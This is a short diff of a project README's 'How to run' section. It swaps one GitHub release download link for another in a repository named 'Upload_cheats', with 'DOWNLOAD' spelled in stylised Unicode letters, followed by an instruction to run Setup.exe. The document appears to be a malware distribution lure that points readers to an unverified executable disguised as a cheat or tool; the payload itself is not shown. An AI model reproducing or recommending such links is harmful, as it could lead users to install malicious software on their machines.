@@ -18,7 +18,7 @@
 
 ## How to run
 
-- # 🄳🄾🅆🄽🄻🄾🄰🄳: https://github.com/dinsherman202/solid-lamp/releases/tag/Download
+- # 🄳🄾🅆🄽🄻🄾🄰🄳: https://github.com/sparkysummer562/Upload_cheats/releases/tag/Download
 - Run - Setup.exe
 
 
